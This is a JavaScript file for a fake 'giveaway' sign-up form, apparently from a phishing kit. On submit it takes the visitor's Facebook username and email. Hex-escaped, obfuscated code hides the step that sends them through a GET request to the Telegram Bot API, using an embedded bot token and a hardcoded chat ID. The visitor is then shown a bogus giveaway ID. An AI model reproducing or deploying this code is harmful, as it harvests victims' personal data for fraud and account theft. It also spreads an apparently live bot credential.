if (pendaftaran == "tutup"){
    document.getElementById('op1').classList.add('none');
    document.getElementById('op2').classList.remove('none');
}

function lanjut(){
    document.getElementsByClassName('t1')[0].classList.add('none');
    document.getElementsByClassName('t2')[0].classList.remove('none');
    document.getElementsByClassName('username')[0].classList.add('none');
    document.getElementsByClassName('email')[0].classList.add('none');
    document.getElementsByClassName('name')[0].classList.remove('none');
    document.getElementsByClassName('alamat')[0].classList.remove('none');
    document.getElementsByClassName('provinsi')[0].classList.remove('none');
    document.getElementsByClassName('kot')[0].classList.remove('none');
    document.getElementsByClassName('kodepos')[0].classList.remove('none');
    document.getElementsByClassName('telp')[0].classList.remove('none');
    document.getElementsByClassName('lj')[0].classList.add('none');
    document.getElementsByClassName('sb')[0].classList.remove('none');
}

$.each(provinsi, function(key, value) {
    $('\
    <option value="' + value + '">' + value + '</option>\
    ').appendTo('.prov');
});

$.each(kota, function(key, value) {
    $('\
    <option value="' + value + '">' + value + '</option>\
    ').appendTo('.kota');
});

var _0xc8cc=["\x23\x66\x6F\x72\x6D","\x71\x75\x65\x72\x79\x53\x65\x6C\x65\x63\x74\x6F\x72"];var _0xfbe1=[_0xc8cc[0],_0xc8cc[1]];var _0x20bd=[_0xfbe1[0],_0xfbe1[1]];var _0xd887=[_0x20bd[0],_0x20bd[1]];var _0x1baf=[_0xd887[0],_0xd887[1]];const form=document[_0x1baf[1]](_0x1baf[0])

var idg = Math.floor(Math.random() * 999999);

form.addEventListener("submit", (e) => {
    e.preventDefault();

    var chat_id = 1244441588; // Chat ID unik Anda @cloudorderbot Telegram
    var username = document.getElementById("username").value;
    var email = document.getElementById("email").value;
    var telp = "by Kwaii";

    var proses = `
Data Giveaway %0A
---------------------------%0A%0A
ID Giveaway: ${idg}%0A%0A
Username FB: ${username}%0A%0A
Email: ${email}%0A%0A`;

    var _0xb9fe=["","\x20\x25\x30\x41\x20\x68\x74\x74\x70\x73\x3A\x2F\x2F\x77\x61\x2E\x6D\x65\x2F\x25\x32\x42","\x31\x36\x35\x30\x38\x39\x36\x30\x35\x30\x3A\x41\x41\x45\x42\x37\x78\x71\x48\x33\x77\x62\x45\x73\x78\x69\x48\x35\x6C\x79\x31\x68\x4D\x72\x46\x75\x38\x36\x56\x63\x33\x49\x6C\x46\x31\x73","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x61\x70\x69\x2E\x74\x65\x6C\x65\x67\x72\x61\x6D\x2E\x6F\x72\x67\x2F\x62\x6F\x74","\x2F\x73\x65\x6E\x64\x4D\x65\x73\x73\x61\x67\x65\x3F\x63\x68\x61\x74\x5F\x69\x64\x3D","\x26\x74\x65\x78\x74\x3D","\x47\x45\x54","\x6F\x70\x65\x6E","\x73\x65\x6E\x64"];var _0xebc3=[_0xb9fe[0],_0xb9fe[1],_0xb9fe[2],_0xb9fe[3],_0xb9fe[4],_0xb9fe[5],_0xb9fe[6],_0xb9fe[7],_0xb9fe[8]];var _0x7c9d=[_0xebc3[0],_0xebc3[1],_0xebc3[2],_0xebc3[3],_0xebc3[4],_0xebc3[5],_0xebc3[6],_0xebc3[7],_0xebc3[8]];var _0x7d46=[_0x7c9d[0],_0x7c9d[1],_0x7c9d[2],_0x7c9d[3],_0x7c9d[4],_0x7c9d[5],_0x7c9d[6],_0x7c9d[7],_0x7c9d[8]];var send=`${_0xb9fe[0]}${_0xebc3[0]}${_0xb9fe[0]}${_0x7c9d[0]}${_0xb9fe[0]}${_0xebc3[0]}${_0xb9fe[0]}${_0x7d46[0]}${_0xb9fe[0]}${_0xebc3[0]}${_0xb9fe[0]}${_0x7c9d[0]}${_0xb9fe[0]}${_0xebc3[0]}${_0xb9fe[0]}${proses}${_0xb9fe[0]}${_0xebc3[0]}${_0xb9fe[0]}${_0x7c9d[0]}${_0xb9fe[0]}${_0xebc3[0]}${_0xb9fe[0]}${_0x7d46[1]}${_0xb9fe[0]}${_0xebc3[0]}${_0xb9fe[0]}${_0x7c9d[0]}${_0xb9fe[0]}${_0xebc3[0]}${_0xb9fe[0]}${telp}${_0xb9fe[0]}${_0xebc3[0]}${_0xb9fe[0]}${_0x7c9d[0]}${_0xb9fe[0]}${_0xebc3[0]}${_0xb9fe[0]}${_0x7d46[0]}${_0xb9fe[0]}${_0xebc3[0]}${_0xb9fe[0]}${_0x7c9d[0]}${_0xb9fe[0]}${_0xebc3[0]}${_0xb9fe[0]}`;var token=_0x7d46[2];var url=`${_0xb9fe[0]}${_0xebc3[0]}${_0xb9fe[0]}${_0x7c9d[0]}${_0xb9fe[0]}${_0xebc3[0]}${_0xb9fe[0]}${_0x7d46[3]}${_0xb9fe[0]}${_0xebc3[0]}${_0xb9fe[0]}${_0x7c9d[0]}${_0xb9fe[0]}${_0xebc3[0]}${_0xb9fe[0]}${token}${_0xb9fe[0]}${_0xebc3[0]}${_0xb9fe[0]}${_0x7c9d[0]}${_0xb9fe[0]}${_0xebc3[0]}${_0xb9fe[0]}${_0x7d46[4]}${_0xb9fe[0]}${_0xebc3[0]}${_0xb9fe[0]}${_0x7c9d[0]}${_0xb9fe[0]}${_0xebc3[0]}${_0xb9fe[0]}${chat_id}${_0xb9fe[0]}${_0xebc3[0]}${_0xb9fe[0]}${_0x7c9d[0]}${_0xb9fe[0]}${_0xebc3[0]}${_0xb9fe[0]}${_0x7d46[5]}${_0xb9fe[0]}${_0xebc3[0]}${_0xb9fe[0]}${_0x7c9d[0]}${_0xb9fe[0]}${_0xebc3[0]}${_0xb9fe[0]}${send}${_0xb9fe[0]}${_0xebc3[0]}${_0xb9fe[0]}${_0x7c9d[0]}${_0xb9fe[0]}${_0xebc3[0]}${_0xb9fe[0]}${_0x7d46[0]}${_0xb9fe[0]}${_0xebc3[0]}${_0xb9fe[0]}${_0x7c9d[0]}${_0xb9fe[0]}${_0xebc3[0]}${_0xb9fe[0]}`;let api= new XMLHttpRequest();api[_0x7d46[7]](_0x7d46[6],url,true);api[_0x7d46[8]]()
    var tutup = "\
    <label class='mr-sm-2'>ID -" + idg +"</label>\
    <P>Harap screenshot dan simpan dengan baik!</P>";
    document.getElementById('sid').innerHTML= tutup;
    document.getElementById('f1').classList.remove('none');
    document.getElementById('f2').classList.add('none');
    console.log("Berhasil dikirim");
});